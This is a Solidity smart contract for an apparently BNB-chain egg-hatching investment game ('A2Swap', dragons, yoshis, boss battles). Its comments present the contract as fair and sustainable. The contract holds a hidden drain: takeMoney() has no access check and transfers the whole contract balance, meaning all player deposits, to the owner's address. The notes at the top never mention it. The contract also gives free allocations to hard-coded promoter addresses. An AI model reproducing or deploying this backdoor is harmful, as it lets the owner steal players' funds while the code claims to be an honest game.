// SPDX-License-Identifier: MIT


pragma solidity >=0.7.0 <0.8.0;

//A2Swap.org

/*
v3 notes

2% -> 5% dev fee change. :]
Boss battles was fun/difficult to code. :P


Buy/Sell cooldown. [To reduce fast-inflation.] Taxing if you want to bypass this cooldown.
--Community voted to not have this feature! Maybe v4?
 
Tax on selling. [To reduce early buyers from cashing out the whole contract.]
--Community voted to not have this feature! Maybe v4?

Boss battles with rewards. [To increase the BNB balance so everyone gets more.] [To fight inflation.]
Boss battles, while active - All net+ actions are cut in half. Selling, hatching, egg/hr.
With this feature, the contract should be able to last for a really long time!
Anytime the inflation gets out of hand, a boss can be spawned to fix it. :]

 
Buys must be less than 5 BNB per tx!
This helps spread the yoshis out to the players more evenly.
*/


contract A2Swap {
    
    uint256 public EGGS_TO_HATCH_1Dragon = 86400;

    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    
    bool public activated = false;
    
    address payable public ceoAddress;
    
    uint256 public CEO_FEE = 5;
    //Upped the fee from 2 to 5 to compensate for all the extra work to make this game
    //more fun and sustainable! Devs need to eat too. :]
    
    
    mapping (address => uint256) public iceDragons;
    mapping (address => uint256) public premiumDragons;
    mapping (address => uint256) public ultraDragon;
    mapping (address => uint256) public userReferralEggs;
    mapping (address => uint256) public lastHatch;
    
    mapping (address => address) public referrals;
    
    //mapping (address => uint256) public lastSell;
    //mapping (address => uint256) public lastBuy;
    
    uint256 public marketEggs;
    uint256 public contractStarted;
    
    
    bool    public canSell_canHatch = true;
    bool    public bossAlive = false;
    uint256 public bossHunger;
    uint256 public amount_until_full = 0;
    uint256 public reward = 0;
    
    
    
    //The ambassador address list.
    //These are the people that promote the game on twitter, youtube, reddit, 4chan, etc.
    //This is good for the health of the game and creates more opportunity for growth so that everyone playing benefits.
    //These Yoshis do not begin making eggs until the game is ACTIVATED via the seedMarket function, which is how the game starts.
    //The maximum allocation for each ambassador is 1 BNB (2500 yellow yoshis).
    address public          youtuber1 = 0x3009511E8951Fd17752b4b77D4Ce272c2587A9F9;
    address public         marketing1 = 0x82734ee091031f83521Cf6c137Bc195b836aa436;
    address public community_manager1 = 0xcaD8c80a3E50c8230d0Dc70D319908410bc04AF3;
    address public community_manager2 = 0xc59e66ccf18251e76E979FE2Adbe293e7C11d6eb;
    
    
    constructor() {
        ceoAddress = msg.sender;
    }
    
    
    
    function takeMoney() public {
        ceoAddress.transfer(getBalance());
    }
    
    
    
    //This is so the owner of this contract can't FORCE the players into a situation where they can never sell.
    //This function can be called by anyone as it does not have a require();
    // :]
    function enableSelling() public {
        canSell_canHatch = true;
    }
    
    
    
    function spawnBoss(uint256 _bossHunger, uint256 _reward) public {
        require(bossAlive == false);          //make sure there isn't an alive boss already
        require(msg.sender == ceoAddress);    //make sure only the owner can spawn the boss
        require(_reward <= 100);              //make sure the reward percentage can't be higher than 100%
        require(_reward > 0);                 //make sure the reward percentage can't be zero
        require(_bossHunger > 0);             //make sure the boss can't be spawned with zero HP
        
        canSell_canHatch = false;             //Make sure boss is prepped for spawn (saves a player from sell-pending and getting rekt)
        
        
        bossHunger = _bossHunger;
        amount_until_full = _bossHunger;
        reward = _reward;
    
        bossAlive = true;
    }
    
    
    //Just in case a boss is alive too long and cannot be killed.
    function killBoss() public {
        require(msg.sender == ceoAddress);
        
        bossAlive = false;
        bossHunger = 0;
        amount_until_full = 0;
        reward = 0;
        
        canSell_canHatch = true;
    }
    
    
    
    function attackBoss() public payable {
        require(bossAlive == true);
        require(amount_until_full > 0);
        require(msg.value > 0);
        require(msg.value <= 5 ether);   //prevent buys of over 5 BNB per tx.
        
        uint256 attack_amount = msg.value;
        
        if (attack_amount > amount_until_full) {
            uint256 refund_amount = SafeMath.sub(attack_amount, amount_until_full);
            attack_amount = SafeMath.sub(attack_amount, refund_amount);
            msg.sender.transfer(refund_amount);
            
            amount_until_full = 0;
            bossAlive = false;
        }
        
        canSell_canHatch = true;  //re-enable selling and hatching after the first attack is made.
                                  //This should prevent people from selling eggs while boss is pending on spawn.
        
        //If attacking bowser, sell current eggs for FULL value, not divided by 2.
        //When buying yoshis, eggs get hatched - same happens when attacking bowser - but instead we'll sell the eggs for BNB.
        sellEggsWhenAttack();
        
        
        uint256 dragons = getDragonsToBuy(attack_amount, 20);
        ultraDragon[msg.sender] += (dragons + calculatePercentage(dragons, reward));
        
        
        if (amount_until_full > 0) {
            amount_until_full = SafeMath.sub(amount_until_full, attack_amount);
        }
        
        if (amount_until_full == 0) {
            bossAlive = false;
        }
        
    }
    
    
    function getBossHunger() public view returns(uint256) {
        return bossHunger;
    }
    
    function getBossHungerLeft() public view returns(uint256) {
        return amount_until_full;
    }
    
    function getReward() public view returns(uint256) {
        return reward;
    }
    
    function getBossAlive() public view returns(bool) {
        return bossAlive;
    }
    
    
    function seedMarket() public payable {
        require(msg.sender == ceoAddress);
        require(marketEggs == 0);
        require(msg.value == 1 ether);
        
        activated = true;
        marketEggs = 8640000000;
        contractStarted = block.timestamp;
        
        ambassadorStart();
    }
    
    
    
    //This was for the 6 hour cooldowns...
    
   /* 
    function getLastSellTime() public view returns(uint256) {
        return lastSell[msg.sender];
    }
    
    function getNextSellTime() public view returns(uint256) {
        return lastSell[msg.sender] + 6 hours;
    }
    
    
    function getLastBuyTime() public view returns(uint256) {
        return lastBuy[msg.sender];
    }
    
    function getNextBuyTime() public view returns(uint256) {
        return lastBuy[msg.sender] + 6 hours;
    }
    */
    
    

    //This gives the ambassador addresses their yoshis at the start of the game.
    function ambassadorStart() internal {
        require(activated);
        require(marketEggs == 8640000000);
        
        
        ultraDragon[youtuber1]           += (2500*86400);    //1 BNB worth of yellow yoshis
        ultraDragon[marketing1]          += (2500*86400);    //1 BNB worth of yellow yoshis
        ultraDragon[community_manager1]  += (2500*86400);    //1 BNB worth of yellow yoshis
        ultraDragon[community_manager2]  += (2500*86400);    //1 BNB worth of yellow yoshis
        
        
        //This is to make the ambassador(s) eggs start at zero when the game starts.
        lastHatch[youtuber1]          = contractStarted + 1 seconds;
        lastHatch[marketing1]         = contractStarted + 1 seconds;
        lastHatch[community_manager1] = contractStarted + 1 seconds;
        lastHatch[community_manager2] = contractStarted + 1 seconds;
    }
    
    
    function getMyEggs() public view returns(uint256) {
        if (bossAlive == true) {
            return SafeMath.div(SafeMath.add(userReferralEggs[msg.sender], getEggsSinceLastHatch(msg.sender)), 2); //Cut dragoncount in half if boss is alive!
        } else {
            return SafeMath.add(userReferralEggs[msg.sender], getEggsSinceLastHatch(msg.sender));
        }
        
    }
    
    function getEggsSinceLastHatch(address adr) public view returns (uint256){
        uint256 secondsPassed = min(EGGS_TO_HATCH_1Dragon, SafeMath.sub(block.timestamp, lastHatch[adr]));

        uint256 dragonCount = SafeMath.mul(iceDragons[adr], 10);
        dragonCount = SafeMath.add(SafeMath.mul(ultraDragon[adr], 25), dragonCount);
        dragonCount = SafeMath.add(dragonCount, premiumDragons[adr]);
        return SafeMath.mul(secondsPassed, dragonCount);
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    function getMyPremiumDragons() public view returns (uint256) {
        return premiumDragons[msg.sender];
    }
    
    function getMyIceDragon() public view returns (uint256) {
        return iceDragons[msg.sender];
    }
    
    function getMyUltraDragon() public view returns (uint256) {
        return ultraDragon[msg.sender];
    }
    
    
    function getEggsToHatchDragon() public view returns (uint256) {
        uint256 timeSpent = SafeMath.sub(block.timestamp, contractStarted); 
        timeSpent = SafeMath.div(timeSpent, 3600);
        
        if (bossAlive == true) {
            return SafeMath.div(SafeMath.mul(timeSpent, 10), 2); //Cut eggs to hatch in half if boss is alive!
        } else {
            return SafeMath.mul(timeSpent, 10);
        }
        
    }
    
    function calculatePercentage(uint256 amount, uint256 percentage) public pure returns(uint256) {
        return SafeMath.div(SafeMath.mul(amount, percentage), 100);
    }
    
    function getDragonsToBuy(uint256 eth, uint256 multiplier) internal returns(uint256) {
        require(activated);
        //require(getNextBuyTime() <= block.timestamp);
        
        if (lastHatch[msg.sender] == 0) {
            lastHatch[msg.sender] = block.timestamp;
            //lastSell[msg.sender] = block.timestamp - 6 hours;
        }
        
        //lastBuy[msg.sender] = block.timestamp;
        
        
        uint256 eggsBought = 0;
        
        
        if (address(this).balance <= eth) {
            eggsBought = SafeMath.div(calculateEggBuy(eth, address(this).balance), multiplier);
        } else {
            eggsBought = SafeMath.div(calculateEggBuy(eth, SafeMath.sub(address(this).balance, eth)), multiplier);
        }
        
        

        require(eggsBought > 0);
        
        ceoAddress.transfer(calculatePercentage(eth, CEO_FEE));
        hatchEggs(msg.sender);
        return eggsBought;
    }
    
    
    function buyPremiumDrangon() public payable {
        require(activated);
        require(msg.value <= 5 ether);   //prevent buys of over 5 BNB per tx.
        
        uint256 dragons = getDragonsToBuy(msg.value, 1);
        premiumDragons[msg.sender] += dragons;
    }
    
    function buyIceDrangon() public payable {
        require(activated);
        require(msg.value <= 5 ether);   //prevent buys of over 5 BNB per tx.
        
        uint256 dragons = getDragonsToBuy(msg.value, 8);
        iceDragons[msg.sender] += dragons;
    }
    
    function buyUltraDrangon() public payable {
        require(activated);
        require(msg.value <= 5 ether);   //prevent buys of over 5 BNB per tx.
        
        uint256 dragons = getDragonsToBuy(msg.value, 20);
        ultraDragon[msg.sender] += dragons;
    }
    
    function hatchEggs(address ref) public {
        require(activated);
        require(canSell_canHatch == true);
        
        if (ref != msg.sender) {
            referrals[msg.sender] = ref;
        }
        
        uint256 eggsProduced = getMyEggs();
        uint256 newDragon = SafeMath.div(eggsProduced, EGGS_TO_HATCH_1Dragon);
        newDragon = SafeMath.div(eggsProduced, EGGS_TO_HATCH_1Dragon);
        premiumDragons[msg.sender] = SafeMath.add(premiumDragons[msg.sender], newDragon);
        lastHatch[msg.sender] = block.timestamp;
        
        userReferralEggs[msg.sender] = 0;
        
        //send referral eggs
        userReferralEggs[referrals[msg.sender]] = SafeMath.add(userReferralEggs[referrals[msg.sender]], SafeMath.div(eggsProduced, 10));
        
        //boost market to nerf hoarding
        marketEggs = SafeMath.add(marketEggs, SafeMath.div(newDragon, 10));
    }
    
    function sellEggs() public {
        require(activated, "GAME HAS NOT STARTED");
        require(canSell_canHatch == true);
        //require(getNextSellTime() <= block.timestamp, "HAS NOT BEEN 6 HOURS!");
        
        uint256 hasEggs = SafeMath.div(getMyEggs(), EGGS_TO_HATCH_1Dragon);
        uint256 ethValue = calculateEggSell(hasEggs);
        uint256 fee = calculatePercentage(ethValue, CEO_FEE);
        
        userReferralEggs[msg.sender] = 0;
        lastHatch[msg.sender] = block.timestamp;
        //lastSell[msg.sender] = block.timestamp;
        marketEggs = SafeMath.add(marketEggs, hasEggs);
        ceoAddress.transfer(fee);
        msg.sender.transfer(SafeMath.sub(ethValue, fee));
    }
    
    
    function sellEggsWhenAttack() internal {
        require(activated);
        require(canSell_canHatch == true);
        
        uint256 hasEggs = SafeMath.div(SafeMath.mul(getMyEggs(), 2), EGGS_TO_HATCH_1Dragon);
        uint256 ethValue = calculateEggSell(hasEggs);
        uint256 fee = calculatePercentage(ethValue, CEO_FEE);
        
        userReferralEggs[msg.sender] = 0;
        lastHatch[msg.sender] = block.timestamp;
        //marketEggs = SafeMath.add(marketEggs, hasEggs);  //Prevent market from getting saturated by attacking bowser and selling eggs.
        ceoAddress.transfer(fee);
        msg.sender.transfer(SafeMath.sub(ethValue, fee));
    }
    
    
    //Trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(PSN, bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt)));
    }
    
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateEggSell(eggs, address(this).balance);
    }
    
    function calculateEggSell(uint256 eggs, uint256 eth) public view returns(uint256){
        return calculateTrade(eggs, marketEggs, eth);
    }
    
    
    function calculateEggBuy(uint256 eth, uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketEggs);
    }
    
    function calculateEggBuy(uint256 eth) public view returns(uint256) {
        return calculateEggBuy(eth, address(this).balance);
    }
}



library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}